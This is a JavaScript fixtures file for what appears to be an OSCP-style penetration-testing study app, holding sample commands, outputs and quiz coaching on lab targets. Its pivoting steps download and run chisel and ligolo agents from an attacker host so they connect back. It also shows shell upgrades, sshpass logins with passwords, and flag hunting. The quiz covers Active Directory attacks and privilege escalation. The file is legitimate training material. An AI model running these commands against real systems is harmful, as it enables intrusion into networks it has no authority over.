      teach: 'A raw netcat shell has no job control, no arrows, no tab-complete, and dies on Ctrl-C. The fix is two-sided: spawn a PTY inside the shell, then background it with Ctrl-Z and fix YOUR terminal with stty before foregrounding. Do it before anything interactive, like su or ssh.',
      steps: [
        { where: 'host', tool: 'python3', cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", output: [
          'www-data@target:/$',
          '# now press Ctrl-Z to background this shell',
        ].join('\n') },
        { where: 'local', tool: 'sh', cmd: 'stty raw -echo; fg', output: [
          'nc -lvnp 4444',
          'www-data@target:/$ export TERM=xterm',
        ].join('\n') },
      ],
    },
    'linux-remote-exec': {
      cmd: "sshpass -p 'Autumn2026!' ssh -o StrictHostKeyChecking=no bob@10.10.10.10 id", tool: 'sshpass',
      output: [
        'uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)',
      ].join('\n'),
      signal: 'uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)',
      teach: 'Once you have a password, you can run a single command over SSH non-interactively, handy for scripted checks. The sudo group in bob\'s id output is a privesc lead: a sudo-group user can often get root directly.',
    },

    // ============================ PIVOTING & TUNNELING ============================
    'local-linux-interfaces': {
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip -o addr show', tool: 'sshpass',
      output: [
        '2: eth0    inet 10.10.10.10/24 scope global eth0',
        '3: eth1    inet 172.16.5.10/24 scope global eth1',
      ].join('\n'),
      signal: '3: eth1    inet 172.16.5.10/24 scope global eth1',
      teach: 'A compromised host with a second NIC is a doorway. eth1 on 172.16.5.0/24 is a network you could not reach before, the reason to pivot. Map the host\'s interfaces first; they tell you what is now in range.',
    },
    'local-linux-routes': {
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip route', tool: 'sshpass',
      output: [
        'default via 10.10.10.1 dev eth0',
        '172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10',
      ].join('\n'),
      signal: '172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10',
      teach: 'The routing table shows which networks this host reaches directly. A route to 172.16.5.0/24 that you cannot touch from your box is exactly what you pivot through this host to reach.',
    },
    'local-linux-neighbors': {
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip neigh show', tool: 'sshpass',
      output: [
        '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
        '172.16.5.25 dev eth1 lladdr 00:0c:29:dd:ee:ff STALE',
      ].join('\n'),
      signal: '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
      teach: 'The ARP/neighbour cache lists hosts this box has actually talked to on the internal segment, live, confirmed targets you could not see from outside. It is a free, no-scan map of what is alive next door.',
    },
    'local-linux-dns': {
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 cat /etc/resolv.conf', tool: 'sshpass',
      output: [
        'search acme.internal',
        'nameserver 172.16.5.5',
      ].join('\n'),
      signal: 'nameserver 172.16.5.5',
      teach: 'The internal DNS server and search domain tell you this host lives in acme.internal and resolves via 172.16.5.5, likely a domain controller. Internal DNS is both a high-value target and a way to enumerate the network by name.',
    },
    'local-windows-interfaces': {
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "ipconfig"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01  Ethernet adapter Ethernet0:',
        'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 10.10.10.20',
        'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 172.16.5.20',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 172.16.5.20',
      teach: 'A dual-homed Windows host bridges two networks. The second address (172.16.5.20) is on a segment you reach only through this box, the reason to pivot. Map the interfaces first; they define what is now in range.',
    },
    'local-windows-routes': {
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "route print"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01  Network Destination  Netmask        Interface',
        'WINRM  10.10.10.20  5985  WS01  172.16.5.0           255.255.255.0  172.16.5.20',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01  172.16.5.0           255.255.255.0  172.16.5.20',
      teach: 'route print shows the networks this host routes to directly. A 172.16.5.0/24 entry on the internal NIC is a subnet reachable from here but not from your box, your pivot target.',
    },
    'local-windows-neighbors': {
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "arp -a"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01  Interface: 172.16.5.20',
        'WINRM  10.10.10.20  5985  WS01    172.16.5.5    00-0c-29-11-22-33  dynamic',
        'WINRM  10.10.10.20  5985  WS01    172.16.5.30   00-0c-29-44-55-66  dynamic',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01    172.16.5.5    00-0c-29-11-22-33  dynamic',
      teach: 'The Windows ARP cache lists internal hosts this box has communicated with, confirmed-alive targets on the far side, found without sending a scan packet. Start your internal enumeration from these.',
    },
    'local-windows-listeners': {
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "netstat -ano"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01    TCP  0.0.0.0:445      LISTENING  4',
        'WINRM  10.10.10.20  5985  WS01    TCP  127.0.0.1:1433   LISTENING  3120',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01    TCP  127.0.0.1:1433   LISTENING  3120',
      teach: 'A service bound to 127.0.0.1 is reachable only from the box itself, like MSSQL on 1433 here. You cannot hit it from the network, but once you tunnel in, that loopback-only service becomes a target. Local listeners reveal what a pivot unlocks.',
    },
    'pivot-chisel-socks': {
      signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
      teach: 'Chisel builds a SOCKS proxy back through the compromised host, but chisel is not on that host yet, so the chain is: start the reverse server on your box, serve the chisel binary, pull it down and run the client on the target, then point proxychains at 127.0.0.1:1080. After that your tools reach the internal network through the one box you own.',
      steps: [
        { where: 'local', tool: 'chisel', cmd: 'chisel server -p 8080 --reverse', output: [
          'server: Reverse tunnelling enabled',
          'server: Listening on http://0.0.0.0:8080',
        ].join('\n') },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding the chisel binary', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.5:8080 R:1080:socks', output: [
          "Saved '/tmp/chisel' [8577024/8577024]",
          'client: Connected to http://10.10.14.5:8080',
          'client: tun: proxy#R:127.0.0.1:1080=>socks',
        ].join('\n') },
        { where: 'local', tool: 'sh', cmd: "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf", output: 'socks5 127.0.0.1 1080' },
      ],
    },
    'pivot-ligolo': {
      signal: '[+] Route to 172.16.5.0/24 added via ligolo, internal subnet reachable',
      teach: 'Ligolo-ng gives you a REAL network interface to the internal subnet, fast, no proxychains. But the agent is not on the host yet, so the full chain spans both machines: on your box create the tun, start the proxy, and serve the agent binary; on the target download it, make it executable and run it so it connects back; then on your box select the session and add the internal route. After that your box reaches 172.16.5.0/24 natively.',
      steps: [
        { where: 'local', tool: 'ligolo-proxy', cmd: 'sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert', output: [
          'ligolo-proxy » Listening on 0.0.0.0:11601 (self-signed TLS)',
        ].join('\n') },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding the Linux "agent" binary', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/agent -O /tmp/.a && chmod +x /tmp/.a && /tmp/.a -connect 10.10.14.5:11601 -ignore-cert', output: [
          "Saved '/tmp/.a' [8724234/8724234]",
          'time="10:41:07" level=info msg="Connection established" addr="10.10.14.5:11601"',
        ].join('\n') },
        { where: 'local', tool: 'ligolo-proxy', cmd: 'session   # select the agent, then: sudo ip route add 172.16.5.0/24 dev ligolo', output: [
          'ligolo-proxy » [Agent] joined from 10.10.10.20 (ACME\\WS01)',
          '[+] Route to 172.16.5.0/24 added via ligolo, internal subnet reachable',
        ].join('\n') },
      ],
    },
    'pivot-sshuttle': {
      cmd: 'sshuttle -r bob@10.10.10.10 172.16.5.0/24', tool: 'sshuttle',
      output: [
        'c : Connected to server.',
        'c : Connected to server (internal subnet 172.16.5.0/24 now routed).',
      ].join('\n'),
      signal: 'c : Connected to server.',
      teach: 'sshuttle builds a transparent VPN-like route over SSH from your box alone, no agent on the target. Once "Connected", traffic to 172.16.5.0/24 just works, no proxychains wrapper. The most convenient pivot when you have SSH access.',
    },
    'pivot-ssh-dynamic': {
      signal: 'socks5 127.0.0.1 1080',
      teach: 'An SSH dynamic port-forward (-D) turns an SSH session into a SOCKS proxy, the simplest pivot when you have SSH creds, no extra tools. Open the proxy, then tell proxychains to use it; your tools then reach the internal network through the box.',
      steps: [
        { where: 'local', tool: 'ssh', cmd: 'ssh -D 1080 -N bob@10.10.10.10', output: '# SSH SOCKS proxy now listening on 127.0.0.1:1080 (leave this session open)' },
        { where: 'local', tool: 'sh', cmd: 'grep -i socks /etc/proxychains4.conf', output: 'socks5 127.0.0.1 1080' },
      ],
    },
    'pivot-scan-through': {
      cmd: 'proxychains -q nmap -sT -Pn -n 172.16.5.20', tool: 'proxychains',
      output: [
        'Nmap scan report for 172.16.5.20',
        'PORT    STATE SERVICE',
        '445/tcp open  microsoft-ds',
        '3389/tcp open ms-wbt-server',
      ].join('\n'),
      signal: '445/tcp open  microsoft-ds',
      teach: 'Through a SOCKS proxy you must use TCP connect scans (-sT) and skip host discovery (-Pn), SYN scans and ping do not survive a proxy. Scanning the internal host over your pivot is how enumeration starts again, one network deeper.',
    },

    // ============================ FLAGS & PROOF ============================
    'flag-hunt-linux': {
      cmd: "find / -xdev -type f \\( -name user.txt -o -name root.txt -o -name proof.txt \\) 2>/dev/null", tool: 'sh',
      output: [
        '/home/bob/user.txt',
        '/root/root.txt',
      ].join('\n'),
      signal: '/root/root.txt',
      teach: 'The flags are the point: user.txt in a home directory, root.txt under /root. Capture both, and on a real exam, also screenshot the hostname, your id/whoami, and the IP in the same frame so the proof is undeniable.',
    },
    'flag-hunt-windows': {
      cmd: 'nxc smb 10.10.10.10 -u administrator -H <nthash> --spider C$ --regex "(proof|user|root)\\.txt"', tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  TARGET  //C$/Users/bob/Desktop/user.txt',
        'SMB  10.10.10.10  445  TARGET  //C$/Users/Administrator/Desktop/proof.txt',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  TARGET  //C$/Users/Administrator/Desktop/proof.txt',
      teach: 'On Windows the flags sit on the Desktops, user.txt for the low-priv user, proof.txt (or root.txt) for Administrator. Grab both, and capture whoami, hostname, and ipconfig alongside the flag so your screenshot proves the compromise.',
    },

  };

  // --- retrieval-practice metadata (the "Your turn" gear) ------------------------------------
  // Kept separate from the sample output so each move's (command, output) pair stays obvious. The
  // verdict for each choice is computed in study.js from the real requires; only the choice set and
  // nuance coaching live here. Merged onto the fixtures above.
  var PRACTICE = {
    'nmap-fast-open-ports': { situation: 'You have a target IP and nothing else. Where do you start?', choices: ['nmap-fast-open-ports', 'nmap-version-scripts', 'recon-smb-anon', 'recon-web-triage'], coach: { 'nmap-version-scripts': 'That is the right follow-up, but run a fast all-ports sweep first so you know which ports even exist before you fingerprint them.', 'recon-smb-anon': 'You can only enumerate SMB once you know 445 is open. Scan first.', 'recon-web-triage': 'Same, triage the web only after a scan confirms a web port is there.' } },
    'nmap-version-scripts': { situation: 'Your fast scan found 22, 80 and 445 open. What next?', choices: ['nmap-version-scripts', 'recon-web-triage', 'recon-smb-anon', 'nmap-fast-open-ports'], coach: { 'recon-web-triage': 'Good instinct, and valid, but a version/script scan on all the open ports at once gives you leads on SSH and SMB too, not just the web.', 'recon-smb-anon': 'Also reasonable, but fingerprint the versions first; it is cheap and tells you which services are worth your time.', 'nmap-fast-open-ports': 'Already done, you have the open ports. Now get the versions behind them.' } },
    'recon-smb-anon': { situation: 'The scan shows SMB open on 445 and you have no credentials. What do you try?', choices: ['recon-smb-anon', 'recon-web-triage', 'nmap-version-scripts'], coach: { 'recon-web-triage': 'Fine if there is also a web port, but a free anonymous SMB check costs nothing and often hands you a readable share.', 'nmap-version-scripts': 'You already know the service; now actually enumerate it.' } },
    'recon-web-triage': { situation: 'Port 80 is open. Before brute-forcing anything, what do you do first?', choices: ['recon-web-triage', 'content-discovery', 'nmap-version-scripts'], coach: { 'content-discovery': 'That comes next, but fingerprint the stack first, so your wordlists and attacks match the tech (a WordPress site wants a WordPress approach).', 'nmap-version-scripts': 'Useful, but whatweb/triage tells you the app framework and CMS, which the nmap banner often misses.' } },
    'ad-dc-identify': { situation: 'A fresh scan shows 88, 389 and 445 open on one host, and the LDAP banner names a domain.', choices: ['ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'dcsync'], coach: { 'ad-anon-ldap-enum': 'That is the right next step, but only once you have confirmed this is the DC and captured the domain name. First, name the target.', 'asrep-roast': 'Roasting needs a user list you do not have yet. You are one step too early.', 'dcsync': 'DCSync replicates every hash, it needs Domain Admin. This is the endgame, not the opening.' } },
    'ad-anon-ldap-enum': { situation: 'You have confirmed the DC and the domain is acme.internal. You hold no credentials yet.', choices: ['ad-anon-ldap-enum', 'asrep-roast', 'password-spray', 'dcsync'], coach: { 'asrep-roast': 'Roasting needs a user list first. Get the list, then roast.', 'password-spray': 'Spraying also needs the user list first, same prerequisite.', 'dcsync': 'Needs Domain Admin. Far too early.' } },
    'asrep-roast': { situation: 'Anonymous LDAP handed you a user list and the DC answers on 88. You still have no credentials.', choices: ['asrep-roast', 'password-spray', 'kerberoast', 'dcsync'], coach: { 'password-spray': 'Also valid off the user list, but it puts failed logons on the wire and risks lockout. AS-REP roasting gets crackable material with zero auth attempts, so it is the quieter opening move.', 'kerberoast': 'Kerberoasting needs valid credentials to request service tickets, you have none. AS-REP roasting is its no-creds cousin: same idea, but it targets pre-auth-disabled accounts you can ask for anonymously.', 'dcsync': 'Needs Domain Admin replication rights. This is the endgame, not step one.' } },
    'crack-asrep': { situation: 'You captured a $krb5asrep$23$ hash for tgibson and copied it to your box.', choices: ['crack-asrep', 'password-spray', 'ad-acl-abuse', 'dcsync'], coach: { 'password-spray': 'You could spray, but you are holding a hash that may crack into a real password in seconds. Cash the hash you have first.', 'ad-acl-abuse': 'ACL abuse needs a mapped attack path (BloodHound) and usually a foothold credential, you are not there yet.', 'dcsync': 'Still needs Domain Admin. One cracked user is not that.' } },
    'password-spray': { situation: 'You have a user list and the DC. AS-REP returned nothing roastable, so you try one seasonal password against everyone.', choices: ['password-spray', 'asrep-roast', 'kerberoast', 'dcsync'], coach: { 'asrep-roast': 'Worth trying first (it is quieter), but if it returned nothing roastable, a careful single-password spray is the reasonable next swing.', 'kerberoast': 'Still needs valid creds, which is exactly what the spray is trying to get you. Spray first, then roast service accounts.', 'dcsync': 'Needs Domain Admin. A sprayed low-priv login is not that.' } },
    'ad-acl-abuse': { situation: 'You have a valid domain credential and BloodHound mapped a control path: your user has GenericAll over a privileged group.', choices: ['ad-acl-abuse', 'kerberoast', 'dcsync', 'asrep-roast'], coach: { 'kerberoast': 'Reasonable with creds in hand, but you are holding a direct control-path edge to privilege, walk the ACL path rather than gambling on a crackable service ticket.', 'dcsync': 'The right destination, but you need the replication rights first. The ACL abuse is how you get them.', 'asrep-roast': 'You are well past the no-creds opening now, you already have a credential and a path.' } },
    'dcsync': { situation: 'An ACL path escalated you to a principal with domain replication rights.', choices: ['dcsync', 'ad-acl-abuse', 'kerberoast', 'password-spray'], coach: { 'ad-acl-abuse': 'That was the previous step, the one that got you the replication rights. You are past it now.', 'kerberoast': 'Why crack one service account when you can replicate every hash in the domain? You are beyond this.', 'password-spray': 'Far beneath where you are now, you hold replication rights over the whole domain.' } },
    'content-discovery': { situation: 'You fingerprinted the web stack. Now you want to find what is actually reachable on the server.', choices: ['content-discovery', 'param-discovery', 'lfi-probe', 'recon-web-triage'], coach: { 'param-discovery': 'That comes after you have pages to test, first discover the endpoints, then fuzz each one for hidden parameters.', 'lfi-probe': 'You can only probe a parameter you have found. Map the site first.', 'recon-web-triage': 'Already done, you know the stack. Now enumerate its content.' } },
    'param-discovery': { situation: 'Content discovery found /view.php but it renders blank with no obvious inputs.', choices: ['param-discovery', 'lfi-probe', 'content-discovery'], coach: { 'lfi-probe': 'You need a parameter to probe first, view.php showed none, so fuzz for hidden ones before testing traversal.', 'content-discovery': 'You already have the endpoint; now find its inputs.' } },
    'lfi-probe': { situation: 'You found a page=... parameter on view.php. How do you test whether it is injectable?', choices: ['lfi-probe', 'file-upload', 'param-discovery'], coach: { 'file-upload': 'Different vector, only if there is an upload form. The page= parameter is begging for a traversal test first.', 'param-discovery': 'You already have the parameter; now exploit it.' } },
    'file-upload': { situation: 'An upload form accepts files and you can reach /uploads/ in your browser.', choices: ['file-upload', 'web-shells', 'lfi-probe'], coach: { 'web-shells': 'That is the very next step, once the upload lands a webshell, upgrade it to a reverse shell. But first you have to get the file to execute.', 'lfi-probe': 'A different vector; you have a working upload path, so use it.' } },
    'web-shells': { situation: 'You have code execution through a webshell but it is clunky, one command per request.', choices: ['web-shells', 'linux-enum', 'file-upload'], coach: { 'linux-enum': 'Right idea for after you have a proper shell, but upgrade the clunky webshell to an interactive reverse shell first, then enumerate.', 'file-upload': 'Already done, the upload gave you the webshell you are now upgrading.' } },
    'linux-enum': { situation: 'You just landed an interactive shell as www-data. What is the very first thing you do?', choices: ['linux-enum', 'sudo-abuse', 'suid-gtfobins', 'cron-abuse'], coach: { 'sudo-abuse': 'You cannot know your sudo rights until you enumerate, run the sweep (or sudo -l) first, then act on what it shows.', 'suid-gtfobins': 'Same, enumerate to find which SUID binaries exist before trying to abuse one.', 'cron-abuse': 'You have not found a writable cron yet. Enumerate first; it will point you at the real vector.' } },
    'sudo-abuse': { situation: 'Enumeration flagged your sudo rights. You run sudo -l and see a NOPASSWD entry.', choices: ['sudo-abuse', 'suid-gtfobins', 'cron-abuse', 'linux-enum'], coach: { 'suid-gtfobins': 'Valid if a SUID binary exists, but a NOPASSWD sudo entry on a GTFOBins binary is the cleanest, loudest-green path, take the sure thing.', 'cron-abuse': 'Slower and needs a writable cron; you are holding a direct NOPASSWD-to-root ticket.', 'linux-enum': 'Already done, enumeration is what handed you this sudo lead.' } },
    'suid-gtfobins': { situation: 'Enumeration listed SUID binaries including /usr/bin/find, but you have no sudo rights.', choices: ['suid-gtfobins', 'sudo-abuse', 'pspy-monitor'], coach: { 'sudo-abuse': 'There are no sudo rights here, that path is closed. The SUID bit on a GTFOBins binary is the open door.', 'pspy-monitor': 'Worth running to catch cron jobs, but you already have a direct SUID-to-root binary in hand.' } },
    'pspy-monitor': { situation: 'No sudo and no useful SUID binary. You suspect something runs on a schedule as root.', choices: ['pspy-monitor', 'cron-abuse', 'suid-gtfobins'], coach: { 'cron-abuse': 'That is the payoff, but first you need to see the job and confirm it runs as root and touches something you can write. pspy shows you that.', 'suid-gtfobins': 'Already checked, no usable SUID binary. Watch the process list instead.' } },
    'cron-abuse': { situation: 'pspy showed a root cron running /opt/backup.sh every 2 minutes, and that file is world-writable.', choices: ['cron-abuse', 'pspy-monitor', 'sudo-abuse'], coach: { 'pspy-monitor': 'That was how you found the job, you are past it. Now abuse the writable script the job runs.', 'sudo-abuse': 'No sudo rights here; the writable root cron is the live path.' } },
    'windows-enum': { situation: 'You have a shell as a low-privilege service account on Windows. First move?', choices: ['windows-enum', 'seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated'], coach: { 'seimpersonate': 'You cannot know you hold SeImpersonate until you check, enumerate privileges first, then fire the potato.', 'unquoted-service-path': 'Only viable if such a service exists and a path is writable; the sweep tells you that.', 'alwaysinstallelevated': 'Same, it only works if both registry keys are set. Enumerate to confirm before acting.' } },
    'seimpersonate': { situation: 'Enumeration shows your account has SeImpersonatePrivilege enabled.', choices: ['seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated', 'windows-enum'], coach: { 'unquoted-service-path': 'A valid alternative if one exists, but when you already hold SeImpersonate, the potato is the fastest, most reliable route to SYSTEM.', 'alwaysinstallelevated': 'Also a path if the keys are set, but SeImpersonate is in hand right now.', 'windows-enum': 'Already done, that is what told you SeImpersonate is enabled.' } },
    'unquoted-service-path': { situation: 'Enumeration flagged an unquoted service path, and you have no special privileges.', choices: ['unquoted-service-path', 'weak-service-permissions', 'seimpersonate'], coach: { 'weak-service-permissions': 'Related and worth checking, but that abuses service ACLs directly, here the win is the writable directory in the unquoted path.', 'seimpersonate': 'Only if you hold that privilege; this account does not. The unquoted path is the lead you have.' } },
    'weak-service-permissions': { situation: 'accesschk shows your group has write access to a service configuration.', choices: ['weak-service-permissions', 'unquoted-service-path', 'alwaysinstallelevated'], coach: { 'unquoted-service-path': 'A different service-based trick; use it when the path is unquoted and a dir is writable. Here you can rewrite the service config directly, simpler.', 'alwaysinstallelevated': 'Only if the MSI keys are set. You already hold write access to a service.' } },
    'alwaysinstallelevated': { situation: 'Enumeration shows AlwaysInstallElevated = 1. You check both hives to be sure.', choices: ['alwaysinstallelevated', 'seimpersonate', 'weak-service-permissions'], coach: { 'seimpersonate': 'Only if you hold that privilege; this path is a registry misconfig instead. Both keys being 0x1 is a free SYSTEM.', 'weak-service-permissions': 'A valid alternative when service ACLs are loose; here the MSI policy is the open door.' } },
  };
  Object.keys(PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var p = PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = p.situation; OBOL.STUDY_FIXTURES[k].choices = p.choices; OBOL.STUDY_FIXTURES[k].coach = p.coach; } });

})(typeof globalThis !== 'undefined' ? globalThis : this);
